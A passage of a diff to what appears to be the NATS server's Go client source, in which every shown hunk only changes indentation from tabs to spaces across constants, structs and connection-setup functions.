)\n \n func init() {\n-\trand.Seed(time.Now().UnixNano())\n+        rand.Seed(time.Now().UnixNano())\n }\n \n const (\n-\t// Scratch buffer size for the processMsg() calls.\n-\tmsgScratchSize  = 1024\n-\tmsgHeadProto    = \"RMSG \"\n-\tmsgHeadProtoLen = len(msgHeadProto)\n-\n-\t// For controlling dynamic buffer sizes.\n-\tstartBufSize    = 512   // For INFO/CONNECT block\n-\tminBufSize      = 64    // Smallest to shrink to for PING/PONG\n-\tmaxBufSize      = 65536 // 64k\n-\tshortsToShrink  = 2     // Trigger to shrink dynamic buffers\n-\tmaxFlushPending = 10    // Max fsps to have in order to wait for writeLoop\n-\treadLoopReport  = 2 * time.Second\n-\n-\t// Server should not send a PING (for RTT) before the first PONG has\n-\t// been sent to the client. However, in case some client libs don't\n-\t// send CONNECT+PING, cap the maximum time before server can send\n-\t// the RTT PING.\n-\tmaxNoRTTPingBeforeFirstPong = 2 * time.Second\n-\n-\t// For stalling fast producers\n-\tstallClientMinDuration = 100 * time.Millisecond\n-\tstallClientMaxDuration = time.Second\n+        // Scratch buffer size for the processMsg() calls.\n+        msgScratchSize  = 1024\n+        msgHeadProto    = \"RMSG \"\n+        msgHeadProtoLen = len(msgHeadProto)\n+\n+        // For controlling dynamic buffer sizes.\n+        startBufSize    = 512   // For INFO/CONNECT block\n+        minBufSize      = 64    // Smallest to shrink to for PING/PONG\n+        maxBufSize      = 65536 // 64k\n+        shortsToShrink  = 2     // Trigger to shrink dynamic buffers\n+        maxFlushPending = 10    // Max fsps to have in order to wait for writeLoop\n+        readLoopReport  = 2 * time.Second\n+\n+        // Server should not send a PING (for RTT) before the first PONG has\n+        // been sent to the client. However, in case some client libs don't\n+        // send CONNECT+PING, cap the maximum time before server can send\n+        // the RTT PING.\n+        maxNoRTTPingBeforeFirstPong = 2 * time.Second\n+\n+        // For stalling fast producers\n+        stallClientMinDuration = 100 * time.Millisecond\n+        stallClientMaxDuration = time.Second\n )\n \n var readLoopReportThreshold = readLoopReport\n@@ -118,50 +118,50 @@ var readLoopReportThreshold = readLoopReport\n type clientFlag uint16\n \n const (\n-\thdrLine      = \"NATS/1.0\\r\\n\"\n-\temptyHdrLine = \"NATS/1.0\\r\\n\\r\\n\"\n+        hdrLine      = \"NATS/1.0\\r\\n\"\n+        emptyHdrLine = \"NATS/1.0\\r\\n\\r\\n\"\n )\n \n // Some client state represented as flags\n const (\n-\tconnectReceived        clientFlag = 1 << iota // The CONNECT proto has been received\n-\tinfoReceived                                  // The INFO protocol has been received\n-\tfirstPongSent                                 // The first PONG has been sent\n-\thandshakeComplete                             // For TLS clients, indicate that the handshake is complete\n-\tflushOutbound                                 // Marks client as having a flushOutbound call in progress.\n-\tnoReconnect                                   // Indicate that on close, this connection should not attempt a reconnect\n-\tcloseConnection                               // Marks that closeConnection has already been called.\n-\tconnMarkedClosed                              // Marks that markConnAsClosed has already been called.\n-\twriteLoopStarted                              // Marks that the writeLoop has been started.\n-\tskipFlushOnClose                              // Marks that flushOutbound() should not be called on connection close.\n-\texpectConnect                                 // Marks if this connection is expected to send a CONNECT\n-\tconnectProcessFinished                        // Marks if this connection has finished the connect process.\n+        connectReceived        clientFlag = 1 << iota // The CONNECT proto has been received\n+        infoReceived                                  // The INFO protocol has been received\n+        firstPongSent                                 // The first PONG has been sent\n+        handshakeComplete                             // For TLS clients, indicate that the handshake is complete\n+        flushOutbound                                 // Marks client as having a flushOutbound call in progress.\n+        noReconnect                                   // Indicate that on close, this connection should not attempt a reconnect\n+        closeConnection                               // Marks that closeConnection has already been called.\n+        connMarkedClosed                              // Marks that markConnAsClosed has already been called.\n+        writeLoopStarted                              // Marks that the writeLoop has been started.\n+        skipFlushOnClose                              // Marks that flushOutbound() should not be called on connection close.\n+        expectConnect                                 // Marks if this connection is expected to send a CONNECT\n+        connectProcessFinished                        // Marks if this connection has finished the connect process.\n )\n \n // set the flag (would be equivalent to set the boolean to true)\n func (cf *clientFlag) set(c clientFlag) {\n-\t*cf |= c\n+        *cf |= c\n }\n \n // clear the flag (would be equivalent to set the boolean to false)\n func (cf *clientFlag) clear(c clientFlag) {\n-\t*cf &= ^c\n+        *cf &= ^c\n }\n \n // isSet returns true if the flag is set, false otherwise\n func (cf clientFlag) isSet(c clientFlag) bool {\n-\treturn cf&c != 0\n+        return cf&c != 0\n }\n \n // setIfNotSet will set the flag `c` only if that flag was not already\n // set and return true to indicate that the flag has been set. Returns\n // false otherwise.\n func (cf *clientFlag) setIfNotSet(c clientFlag) bool {\n-\tif *cf&c == 0 {\n-\t\t*cf |= c\n-\t\treturn true\n-\t}\n-\treturn false\n+        if *cf&c == 0 {\n+                *cf |= c\n+                return true\n+        }\n+        return false\n }\n \n // ClosedState is the reason client was closed. This will\n@@ -170,158 +170,158 @@ func (cf *clientFlag) setIfNotSet(c clientFlag) bool {\n type ClosedState int\n \n const (\n-\tClientClosed = ClosedState(iota + 1)\n-\tAuthenticationTimeout\n-\tAuthenticationViolation\n-\tTLSHandshakeError\n-\tSlowConsumerPendingBytes\n-\tSlowConsumerWriteDeadline\n-\tWriteError\n-\tReadError\n-\tParseError\n-\tStaleConnection\n-\tProtocolViolation\n-\tBadClientProtocolVersion\n-\tWrongPort\n-\tMaxAccountConnectionsExceeded\n-\tMaxConnectionsExceeded\n-\tMaxPayloadExceeded\n-\tMaxControlLineExceeded\n-\tMaxSubscriptionsExceeded\n-\tDuplicateRoute\n-\tRouteRemoved\n-\tServerShutdown\n-\tAuthenticationExpired\n-\tWrongGateway\n-\tMissingAccount\n-\tRevocation\n-\tInternalClient\n-\tMsgHeaderViolation\n-\tNoRespondersRequiresHeaders\n-\tClusterNameConflict\n-\tDuplicateRemoteLeafnodeConnection\n-\tDuplicateClientID\n+        ClientClosed = ClosedState(iota + 1)\n+        AuthenticationTimeout\n+        AuthenticationViolation\n+        TLSHandshakeError\n+        SlowConsumerPendingBytes\n+        SlowConsumerWriteDeadline\n+        WriteError\n+        ReadError\n+        ParseError\n+        StaleConnection\n+        ProtocolViolation\n+        BadClientProtocolVersion\n+        WrongPort\n+        MaxAccountConnectionsExceeded\n+        MaxConnectionsExceeded\n+        MaxPayloadExceeded\n+        MaxControlLineExceeded\n+        MaxSubscriptionsExceeded\n+        DuplicateRoute\n+        RouteRemoved\n+        ServerShutdown\n+        AuthenticationExpired\n+        WrongGateway\n+        MissingAccount\n+        Revocation\n+        InternalClient\n+        MsgHeaderViolation\n+        NoRespondersRequiresHeaders\n+        ClusterNameConflict\n+        DuplicateRemoteLeafnodeConnection\n+        DuplicateClientID\n )\n \n // Some flags passed to processMsgResults\n const pmrNoFlag int = 0\n const (\n-\tpmrCollectQueueNames int = 1 << iota\n-\tpmrIgnoreEmptyQueueFilter\n-\tpmrAllowSendFromRouteToRoute\n-\tpmrMsgImportedFromService\n+        pmrCollectQueueNames int = 1 << iota\n+        pmrIgnoreEmptyQueueFilter\n+        pmrAllowSendFromRouteToRoute\n+        pmrMsgImportedFromService\n )\n \n type client struct {\n-\t// Here first because of use of atomics, and memory alignment.\n-\tstats\n-\tgwReplyMapping\n-\tkind  int\n-\tsrv   *Server\n-\tacc   *Account\n-\tperms *permissions\n-\tin    readCache\n-\tparseState\n-\topts       ClientOpts\n-\trrTracking *rrTracking\n-\tmpay       int32\n-\tmsubs      int32\n-\tmcl        int32\n-\tmu         sync.Mutex\n-\tcid        uint64\n-\tstart      time.Time\n-\tnonce      []byte\n-\tpubKey     string\n-\tnc         net.Conn\n-\tncs        atomic.Value\n-\tout        outbound\n-\tuser       *NkeyUser\n-\thost       string\n-\tport       uint16\n-\tsubs       map[string]*subscription\n-\treplies    map[string]*resp\n-\tmperms     *msgDeny\n-\tdarray     []string\n-\tpcd        map[*client]struct{}\n-\tatmr       *time.Timer\n-\tping       pinfo\n-\tmsgb       [msgScratchSize]byte\n-\tlast       time.Time\n-\theaders    bool\n-\n-\trtt      time.Duration\n-\trttStart time.Time\n-\n-\troute *route\n-\tgw    *gateway\n-\tleaf  *leaf\n-\tws    *websocket\n-\tmqtt  *mqtt\n-\n-\tflags clientFlag // Compact booleans into a single field. Size will be increased when needed.\n-\n-\trref byte\n-\n-\ttrace bool\n-\techo  bool\n-\tnoIcb bool\n-\n-\ttags    jwt.TagList\n-\tnameTag string\n-\n-\ttlsTo *time.Timer\n+        // Here first because of use of atomics, and memory alignment.\n+        stats\n+        gwReplyMapping\n+        kind  int\n+        srv   *Server\n+        acc   *Account\n+        perms *permissions\n+        in    readCache\n+        parseState\n+        opts       ClientOpts\n+        rrTracking *rrTracking\n+        mpay       int32\n+        msubs      int32\n+        mcl        int32\n+        mu         sync.Mutex\n+        cid        uint64\n+        start      time.Time\n+        nonce      []byte\n+        pubKey     string\n+        nc         net.Conn\n+        ncs        atomic.Value\n+        out        outbound\n+        user       *NkeyUser\n+        host       string\n+        port       uint16\n+        subs       map[string]*subscription\n+        replies    map[string]*resp\n+        mperms     *msgDeny\n+        darray     []string\n+        pcd        map[*client]struct{}\n+        atmr       *time.Timer\n+        ping       pinfo\n+        msgb       [msgScratchSize]byte\n+        last       time.Time\n+        headers    bool\n+\n+        rtt      time.Duration\n+        rttStart time.Time\n+\n+        route *route\n+        gw    *gateway\n+        leaf  *leaf\n+        ws    *websocket\n+        mqtt  *mqtt\n+\n+        flags clientFlag // Compact booleans into a single field. Size will be increased when needed.\n+\n+        rref byte\n+\n+        trace bool\n+        echo  bool\n+        noIcb bool\n+\n+        tags    jwt.TagList\n+        nameTag string\n+\n+        tlsTo *time.Timer\n }\n \n type rrTracking struct {\n-\trmap map[string]*remoteLatency\n-\tptmr *time.Timer\n-\tlrt  time.Duration\n+        rmap map[string]*remoteLatency\n+        ptmr *time.Timer\n+        lrt  time.Duration\n }\n \n // Struct for PING initiation from the server.\n type pinfo struct {\n-\ttmr  *time.Timer\n-\tlast time.Time\n-\tout  int\n+        tmr  *time.Timer\n+        last time.Time\n+        out  int\n }\n \n // outbound holds pending data for a socket.\n type outbound struct {\n-\tp   []byte        // Primary write buffer\n-\ts   []byte        // Secondary for use post flush\n-\tnb  net.Buffers   // net.Buffers for writev IO\n-\tsz  int32         // limit size per []byte, uses variable BufSize constants, start, min, max.\n-\tsws int32         // Number of short writes, used for dynamic resizing.\n-\tpb  int64         // Total pending/queued bytes.\n-\tpm  int32         // Total pending/queued messages.\n-\tfsp int32         // Flush signals that are pending per producer from readLoop's pcd.\n-\tsg  *sync.Cond    // To signal writeLoop that there is data to flush.\n-\twdl time.Duration // Snapshot of write deadline.\n-\tmp  int64         // Snapshot of max pending for client.\n-\tlft time.Duration // Last flush time for Write.\n-\tstc chan struct{} // Stall chan we create to slow down producers on overrun, e.g. fan-in.\n+        p   []byte        // Primary write buffer\n+        s   []byte        // Secondary for use post flush\n+        nb  net.Buffers   // net.Buffers for writev IO\n+        sz  int32         // limit size per []byte, uses variable BufSize constants, start, min, max.\n+        sws int32         // Number of short writes, used for dynamic resizing.\n+        pb  int64         // Total pending/queued bytes.\n+        pm  int32         // Total pending/queued messages.\n+        fsp int32         // Flush signals that are pending per producer from readLoop's pcd.\n+        sg  *sync.Cond    // To signal writeLoop that there is data to flush.\n+        wdl time.Duration // Snapshot of write deadline.\n+        mp  int64         // Snapshot of max pending for client.\n+        lft time.Duration // Last flush time for Write.\n+        stc chan struct{} // Stall chan we create to slow down producers on overrun, e.g. fan-in.\n }\n \n type perm struct {\n-\tallow *Sublist\n-\tdeny  *Sublist\n+        allow *Sublist\n+        deny  *Sublist\n }\n \n type permissions struct {\n-\t// Have these 2 first for memory alignment due to the use of atomic.\n-\tpcsz   int32\n-\tprun   int32\n-\tsub    perm\n-\tpub    perm\n-\tresp   *ResponsePermission\n-\tpcache sync.Map\n+        // Have these 2 first for memory alignment due to the use of atomic.\n+        pcsz   int32\n+        prun   int32\n+        sub    perm\n+        pub    perm\n+        resp   *ResponsePermission\n+        pcache sync.Map\n }\n \n // This is used to dynamically track responses and reply subjects\n // for dynamic permissioning.\n type resp struct {\n-\tt time.Time\n-\tn int\n+        t time.Time\n+        n int\n }\n \n // msgDeny is used when a user permission for subscriptions has a deny\n@@ -329,139 +329,139 @@ type resp struct {\n // e.g. deny = \"foo\", but user subscribes to \"*\". That subscription should\n // succeed but no message sent on foo should be delivered.\n type msgDeny struct {\n-\tdeny   *Sublist\n-\tdcache map[string]bool\n+        deny   *Sublist\n+        dcache map[string]bool\n }\n \n // routeTarget collects information regarding routes and queue groups for\n // sending information to a remote.\n type routeTarget struct {\n-\tsub *subscription\n-\tqs  []byte\n-\t_qs [32]byte\n+        sub *subscription\n+        qs  []byte\n+        _qs [32]byte\n }\n \n const (\n-\tmaxResultCacheSize   = 512\n-\tmaxDenyPermCacheSize = 256\n-\tmaxPermCacheSize     = 128\n-\tpruneSize            = 32\n-\trouteTargetInit      = 8\n-\treplyPermLimit       = 4096\n+        maxResultCacheSize   = 512\n+        maxDenyPermCacheSize = 256\n+        maxPermCacheSize     = 128\n+        pruneSize            = 32\n+        routeTargetInit      = 8\n+        replyPermLimit       = 4096\n )\n \n // Represent read cache booleans with a bitmask\n type readCacheFlag uint16\n \n const (\n-\thasMappings readCacheFlag = 1 << iota // For account subject mappings.\n+        hasMappings readCacheFlag = 1 << iota // For account subject mappings.\n )\n \n // Used in readloop to cache hot subject lookups and group statistics.\n type readCache struct {\n-\t// These are for clients who are bound to a single account.\n-\tgenid   uint64\n-\tresults map[string]*SublistResult\n+        // These are for clients who are bound to a single account.\n+        genid   uint64\n+        results map[string]*SublistResult\n \n-\t// This is for routes and gateways to have their own L1 as well that is account aware.\n-\tpacache map[string]*perAccountCache\n+        // This is for routes and gateways to have their own L1 as well that is account aware.\n+        pacache map[string]*perAccountCache\n \n-\t// This is for when we deliver messages across a route. We use this structure\n-\t// to make sure to only send one message and properly scope to queues as needed.\n-\trts []routeTarget\n+        // This is for when we deliver messages across a route. We use this structure\n+        // to make sure to only send one message and properly scope to queues as needed.\n+        rts []routeTarget\n \n-\tprand *rand.Rand\n+        prand *rand.Rand\n \n-\t// These are all temporary totals for an invocation of a read in readloop.\n-\tmsgs  int32\n-\tbytes int32\n-\tsubs  int32\n+        // These are all temporary totals for an invocation of a read in readloop.\n+        msgs  int32\n+        bytes int32\n+        subs  int32\n \n-\trsz int32 // Read buffer size\n-\tsrs int32 // Short reads, used for dynamic buffer resizing.\n+        rsz int32 // Read buffer size\n+        srs int32 // Short reads, used for dynamic buffer resizing.\n \n-\t// These are for readcache flags to avoind locks.\n-\tflags readCacheFlag\n+        // These are for readcache flags to avoind locks.\n+        flags readCacheFlag\n }\n \n // set the flag (would be equivalent to set the boolean to true)\n func (rcf *readCacheFlag) set(c readCacheFlag) {\n-\t*rcf |= c\n+        *rcf |= c\n }\n \n // clear the flag (would be equivalent to set the boolean to false)\n func (rcf *readCacheFlag) clear(c readCacheFlag) {\n-\t*rcf &= ^c\n+        *rcf &= ^c\n }\n \n // isSet returns true if the flag is set, false otherwise\n func (rcf readCacheFlag) isSet(c readCacheFlag) bool {\n-\treturn rcf&c != 0\n+        return rcf&c != 0\n }\n \n const (\n-\tdefaultMaxPerAccountCacheSize   = 4096\n-\tdefaultPrunePerAccountCacheSize = 256\n-\tdefaultClosedSubsCheckInterval  = 5 * time.Minute\n+        defaultMaxPerAccountCacheSize   = 4096\n+        defaultPrunePerAccountCacheSize = 256\n+        defaultClosedSubsCheckInterval  = 5 * time.Minute\n )\n \n var (\n-\tmaxPerAccountCacheSize   = defaultMaxPerAccountCacheSize\n-\tprunePerAccountCacheSize = defaultPrunePerAccountCacheSize\n-\tclosedSubsCheckInterval  = defaultClosedSubsCheckInterval\n+        maxPerAccountCacheSize   = defaultMaxPerAccountCacheSize\n+        prunePerAccountCacheSize = defaultPrunePerAccountCacheSize\n+        closedSubsCheckInterval  = defaultClosedSubsCheckInterval\n )\n \n // perAccountCache is for L1 semantics for inbound messages from a route or gateway to mimic the performance of clients.\n type perAccountCache struct {\n-\tacc     *Account\n-\tresults *SublistResult\n-\tgenid   uint64\n+        acc     *Account\n+        results *SublistResult\n+        genid   uint64\n }\n \n func (c *client) String() (id string) {\n-\tloaded := c.ncs.Load()\n-\tif loaded != nil {\n-\t\treturn loaded.(string)\n-\t}\n+        loaded := c.ncs.Load()\n+        if loaded != nil {\n+                return loaded.(string)\n+        }\n \n-\treturn _EMPTY_\n+        return _EMPTY_\n }\n \n // GetNonce returns the nonce that was presented to the user on connection\n func (c *client) GetNonce() []byte {\n-\tc.mu.Lock()\n-\tdefer c.mu.Unlock()\n+        c.mu.Lock()\n+        defer c.mu.Unlock()\n \n-\treturn c.nonce\n+        return c.nonce\n }\n \n // GetName returns the application supplied name for the connection.\n func (c *client) GetName() string {\n-\tc.mu.Lock()\n-\tname := c.opts.Name\n-\tc.mu.Unlock()\n-\treturn name\n+        c.mu.Lock()\n+        name := c.opts.Name\n+        c.mu.Unlock()\n+        return name\n }\n \n // GetOpts returns the client options provided by the application.\n func (c *client) GetOpts() *ClientOpts {\n-\treturn &c.opts\n+        return &c.opts\n }\n \n // GetTLSConnectionState returns the TLS ConnectionState if TLS is enabled, nil\n // otherwise. Implements the ClientAuth interface.\n func (c *client) GetTLSConnectionState() *tls.ConnectionState {\n-\tc.mu.Lock()\n-\tdefer c.mu.Unlock()\n-\tif c.nc == nil {\n-\t\treturn nil\n-\t}\n-\ttc, ok := c.nc.(*tls.Conn)\n-\tif !ok {\n-\t\treturn nil\n-\t}\n-\tstate := tc.ConnectionState()\n-\treturn &state\n+        c.mu.Lock()\n+        defer c.mu.Unlock()\n+        if c.nc == nil {\n+                return nil\n+        }\n+        tc, ok := c.nc.(*tls.Conn)\n+        if !ok {\n+                return nil\n+        }\n+        state := tc.ConnectionState()\n+        return &state\n }\n \n // For CLIENT connections, this function returns the client type, that is,\n@@ -471,31 +471,31 @@ func (c *client) GetTLSConnectionState() *tls.ConnectionState {\n // This function does not lock the client and accesses fields that are supposed\n // to be immutable and therefore it can be invoked outside of the client's lock.\n func (c *client) clientType() int {\n-\tswitch c.kind {\n-\tcase CLIENT:\n-\t\tif c.isMqtt() {\n-\t\t\treturn MQTT\n-\t\t} else if c.isWebsocket() {\n-\t\t\treturn WS\n-\t\t}\n-\t\treturn NATS\n-\tdefault:\n-\t\treturn NON_CLIENT\n-\t}\n+        switch c.kind {\n+        case CLIENT:\n+                if c.isMqtt() {\n+                        return MQTT\n+                } else if c.isWebsocket() {\n+                        return WS\n+                }\n+                return NATS\n+        default:\n+                return NON_CLIENT\n+        }\n }\n \n var clientTypeStringMap = map[int]string{\n-\tNON_CLIENT: _EMPTY_,\n-\tNATS:       \"nats\",\n-\tWS:         \"websocket\",\n-\tMQTT:       \"mqtt\",\n+        NON_CLIENT: _EMPTY_,\n+        NATS:       \"nats\",\n+        WS:         \"websocket\",\n+        MQTT:       \"mqtt\",\n }\n \n func (c *client) clientTypeString() string {\n-\tif typeStringVal, ok := clientTypeStringMap[c.clientType()]; ok {\n-\t\treturn typeStringVal\n-\t}\n-\treturn _EMPTY_\n+        if typeStringVal, ok := clientTypeStringMap[c.clientType()]; ok {\n+                return typeStringVal\n+        }\n+        return _EMPTY_\n }\n \n // This is the main subscription struct that indicates\n@@ -503,1019 +503,1019 @@ func (c *client) clientTypeString() string {\n // FIXME(dlc) - This is getting bloated for normal subs, need\n // to optionally have an opts section for non-normal stuff.\n type subscription struct {\n-\tclient  *client\n-\tim      *streamImport // This is for import stream support.\n-\trsi     bool\n-\tsi      bool\n-\tshadow  []*subscription // This is to track shadowed accounts.\n-\ticb     msgHandler\n-\tsubject []byte\n-\tqueue   []byte\n-\tsid     []byte\n-\torigin  []byte\n-\tnm      int64\n-\tmax     int64\n-\tqw      int32\n-\tclosed  int32\n-\tmqtt    *mqttSub\n+        client  *client\n+        im      *streamImport // This is for import stream support.\n+        rsi     bool\n+        si      bool\n+        shadow  []*subscription // This is to track shadowed accounts.\n+        icb     msgHandler\n+        subject []byte\n+        queue   []byte\n+        sid     []byte\n+        origin  []byte\n+        nm      int64\n+        max     int64\n+        qw      int32\n+        closed  int32\n+        mqtt    *mqttSub\n }\n \n // Indicate that this subscription is closed.\n // This is used in pruning of route and gateway cache items.\n func (s *subscription) close() {\n-\tatomic.StoreInt32(&s.closed, 1)\n+        atomic.StoreInt32(&s.closed, 1)\n }\n \n // Return true if this subscription was unsubscribed\n // or its connection has been closed.\n func (s *subscription) isClosed() bool {\n-\treturn atomic.LoadInt32(&s.closed) == 1\n+        return atomic.LoadInt32(&s.closed) == 1\n }\n \n type ClientOpts struct {\n-\tEcho         bool   `json:\"echo\"`\n-\tVerbose      bool   `json:\"verbose\"`\n-\tPedantic     bool   `json:\"pedantic\"`\n-\tTLSRequired  bool   `json:\"tls_required\"`\n-\tNkey         string `json:\"nkey,omitempty\"`\n-\tJWT          string `json:\"jwt,omitempty\"`\n-\tSig          string `json:\"sig,omitempty\"`\n-\tToken        string `json:\"auth_token,omitempty\"`\n-\tUsername     string `json:\"user,omitempty\"`\n-\tPassword     string `json:\"pass,omitempty\"`\n-\tName         string `json:\"name\"`\n-\tLang         string `json:\"lang\"`\n-\tVersion      string `json:\"version\"`\n-\tProtocol     int    `json:\"protocol\"`\n-\tAccount      string `json:\"account,omitempty\"`\n-\tAccountNew   bool   `json:\"new_account,omitempty\"`\n-\tHeaders      bool   `json:\"headers,omitempty\"`\n-\tNoResponders bool   `json:\"no_responders,omitempty\"`\n-\n-\t// Routes and Leafnodes only\n-\tImport *SubjectPermission `json:\"import,omitempty\"`\n-\tExport *SubjectPermission `json:\"export,omitempty\"`\n+        Echo         bool   `json:\"echo\"`\n+        Verbose      bool   `json:\"verbose\"`\n+        Pedantic     bool   `json:\"pedantic\"`\n+        TLSRequired  bool   `json:\"tls_required\"`\n+        Nkey         string `json:\"nkey,omitempty\"`\n+        JWT          string `json:\"jwt,omitempty\"`\n+        Sig          string `json:\"sig,omitempty\"`\n+        Token        string `json:\"auth_token,omitempty\"`\n+        Username     string `json:\"user,omitempty\"`\n+        Password     string `json:\"pass,omitempty\"`\n+        Name         string `json:\"name\"`\n+        Lang         string `json:\"lang\"`\n+        Version      string `json:\"version\"`\n+        Protocol     int    `json:\"protocol\"`\n+        Account      string `json:\"account,omitempty\"`\n+        AccountNew   bool   `json:\"new_account,omitempty\"`\n+        Headers      bool   `json:\"headers,omitempty\"`\n+        NoResponders bool   `json:\"no_responders,omitempty\"`\n+\n+        // Routes and Leafnodes only\n+        Import *SubjectPermission `json:\"import,omitempty\"`\n+        Export *SubjectPermission `json:\"export,omitempty\"`\n }\n \n var defaultOpts = ClientOpts{Verbose: true, Pedantic: true, Echo: true}\n var internalOpts = ClientOpts{Verbose: false, Pedantic: false, Echo: false}\n \n func (c *client) setTraceLevel() {\n-\tif c.kind == SYSTEM && !(atomic.LoadInt32(&c.srv.logging.traceSysAcc) != 0) {\n-\t\tc.trace = false\n-\t} else {\n-\t\tc.trace = (atomic.LoadInt32(&c.srv.logging.trace) != 0)\n-\t}\n+        if c.kind == SYSTEM && !(atomic.LoadInt32(&c.srv.logging.traceSysAcc) != 0) {\n+                c.trace = false\n+        } else {\n+                c.trace = (atomic.LoadInt32(&c.srv.logging.trace) != 0)\n+        }\n }\n \n // Lock should be held\n func (c *client) initClient() {\n-\ts := c.srv\n-\tc.cid = atomic.AddUint64(&s.gcid, 1)\n-\n-\t// Outbound data structure setup\n-\tc.out.sz = startBufSize\n-\tc.out.sg = sync.NewCond(&(c.mu))\n-\topts := s.getOpts()\n-\t// Snapshots to avoid mutex access in fast paths.\n-\tc.out.wdl = opts.WriteDeadline\n-\tc.out.mp = opts.MaxPending\n-\t// Snapshot max control line since currently can not be changed on reload and we\n-\t// were checking it on each call to parse. If this changes and we allow MaxControlLine\n-\t// to be reloaded without restart, this code will need to change.\n-\tc.mcl = int32(opts.MaxControlLine)\n-\tif c.mcl == 0 {\n-\t\tc.mcl = MAX_CONTROL_LINE_SIZE\n-\t}\n-\n-\tc.subs = make(map[string]*subscription)\n-\tc.echo = true\n-\n-\tc.setTraceLevel()\n-\n-\t// This is a scratch buffer used for processMsg()\n-\t// The msg header starts with \"RMSG \", which can be used\n-\t// for both local and routes.\n-\t// in bytes that is [82 77 83 71 32].\n-\tc.msgb = [msgScratchSize]byte{82, 77, 83, 71, 32}\n-\n-\t// This is to track pending clients that have data to be flushed\n-\t// after we process inbound msgs from our own connection.\n-\tc.pcd = make(map[*client]struct{})\n-\n-\t// snapshot the string version of the connection\n-\tvar conn string\n-\tif c.nc != nil {\n-\t\tif addr := c.nc.RemoteAddr(); addr != nil {\n-\t\t\tif conn = addr.String(); conn != _EMPTY_ {\n-\t\t\t\thost, port, _ := net.SplitHostPort(conn)\n-\t\t\t\tiPort, _ := strconv.Atoi(port)\n-\t\t\t\tc.host, c.port = host, uint16(iPort)\n-\t\t\t\tif c.isWebsocket() && c.ws.clientIP != _EMPTY_ {\n-\t\t\t\t\tcip := c.ws.clientIP\n-\t\t\t\t\t// Surround IPv6 addresses with square brackets, as\n-\t\t\t\t\t// net.JoinHostPort would do...\n-\t\t\t\t\tif strings.Contains(cip, \":\") {\n-\t\t\t\t\t\tcip = \"[\" + cip + \"]\"\n-\t\t\t\t\t}\n-\t\t\t\t\tconn = fmt.Sprintf(\"%s/%s\", cip, conn)\n-\t\t\t\t}\n-\t\t\t\t// Now that we have extracted host and port, escape\n-\t\t\t\t// the string because it is going to be used in Sprintf\n-\t\t\t\tconn = strings.ReplaceAll(conn, \"%\", \"%%\")\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tswitch c.kind {\n-\tcase CLIENT:\n-\t\tswitch c.clientType() {\n-\t\tcase NATS:\n-\t\t\tc.ncs.Store(fmt.Sprintf(\"%s - cid:%d\", conn, c.cid))\n-\t\tcase WS:\n-\t\t\tc.ncs.Store(fmt.Sprintf(\"%s - wid:%d\", conn, c.cid))\n-\t\tcase MQTT:\n-\t\t\tvar ws string\n-\t\t\tif c.isWebsocket() {\n-\t\t\t\tws = \"_ws\"\n-\t\t\t}\n-\t\t\tc.ncs.Store(fmt.Sprintf(\"%s - mid%s:%d\", conn, ws, c.cid))\n-\t\t}\n-\tcase ROUTER:\n-\t\tc.ncs.Store(fmt.Sprintf(\"%s - rid:%d\", conn, c.cid))\n-\tcase GATEWAY:\n-\t\tc.ncs.Store(fmt.Sprintf(\"%s - gid:%d\", conn, c.cid))\n-\tcase LEAF:\n-\t\tvar ws string\n-\t\tif c.isWebsocket() {\n-\t\t\tws = \"_ws\"\n-\t\t}\n-\t\tc.ncs.Store(fmt.Sprintf(\"%s - lid%s:%d\", conn, ws, c.cid))\n-\tcase SYSTEM:\n-\t\tc.ncs.Store(\"SYSTEM\")\n-\tcase JETSTREAM:\n-\t\tc.ncs.Store(\"JETSTREAM\")\n-\tcase ACCOUNT:\n-\t\tc.ncs.Store(\"ACCOUNT\")\n-\t}\n+        s := c.srv\n+        c.cid = atomic.AddUint64(&s.gcid, 1)\n+\n+        // Outbound data structure setup\n+        c.out.sz = startBufSize\n+        c.out.sg = sync.NewCond(&(c.mu))\n+        opts := s.getOpts()\n+        // Snapshots to avoid mutex access in fast paths.\n+        c.out.wdl = opts.WriteDeadline\n+        c.out.mp = opts.MaxPending\n+        // Snapshot max control line since currently can not be changed on reload and we\n+        // were checking it on each call to parse. If this changes and we allow MaxControlLine\n+        // to be reloaded without restart, this code will need to change.\n+        c.mcl = int32(opts.MaxControlLine)\n+        if c.mcl == 0 {\n+                c.mcl = MAX_CONTROL_LINE_SIZE\n+        }\n+\n+        c.subs = make(map[string]*subscription)\n+        c.echo = true\n+\n+        c.setTraceLevel()\n+\n+        // This is a scratch buffer used for processMsg()\n+        // The msg header starts with \"RMSG \", which can be used\n+        // for both local and routes.\n+        // in bytes that is [82 77 83 71 32].\n+        c.msgb = [msgScratchSize]byte{82, 77, 83, 71, 32}\n+\n+        // This is to track pending clients that have data to be flushed\n+        // after we process inbound msgs from our own connection.\n+        c.pcd = make(map[*client]struct{})\n+\n+        // snapshot the string version of the connection\n+        var conn string\n+        if c.nc != nil {\n+                if addr := c.nc.RemoteAddr(); addr != nil {\n+                        if conn = addr.String(); conn != _EMPTY_ {\n+                                host, port, _ := net.SplitHostPort(conn)\n+                                iPort, _ := strconv.Atoi(port)\n+                                c.host, c.port = host, uint16(iPort)\n+                                if c.isWebsocket() && c.ws.clientIP != _EMPTY_ {\n+                                        cip := c.ws.clientIP\n+                                        // Surround IPv6 addresses with square brackets, as\n+                                        // net.JoinHostPort would do...\n+                                        if strings.Contains(cip, \":\") {\n+                                                cip = \"[\" + cip + \"]\"\n+                                        }\n+                                        conn = fmt.Sprintf(\"%s/%s\", cip, conn)\n+                                }\n+                                // Now that we have extracted host and port, escape\n+                                // the string because it is going to be used in Sprintf\n+                                conn = strings.ReplaceAll(conn, \"%\", \"%%\")\n+                        }\n+                }\n+        }\n+\n+        switch c.kind {\n+        case CLIENT:\n+                switch c.clientType() {\n+                case NATS:\n+                        c.ncs.Store(fmt.Sprintf(\"%s - cid:%d\", conn, c.cid))\n+                case WS:\n+                        c.ncs.Store(fmt.Sprintf(\"%s - wid:%d\", conn, c.cid))\n+                case MQTT:\n+                        var ws string\n+                        if c.isWebsocket() {\n+                                ws = \"_ws\"\n+                        }\n+                        c.ncs.Store(fmt.Sprintf(\"%s - mid%s:%d\", conn, ws, c.cid))\n+                }\n+        case ROUTER:\n+                c.ncs.Store(fmt.Sprintf(\"%s - rid:%d\", conn, c.cid))\n+        case GATEWAY:\n+                c.ncs.Store(fmt.Sprintf(\"%s - gid:%d\", conn, c.cid))\n+        case LEAF:\n+                var ws string\n+                if c.isWebsocket() {\n+                        ws = \"_ws\"\n+                }\n+                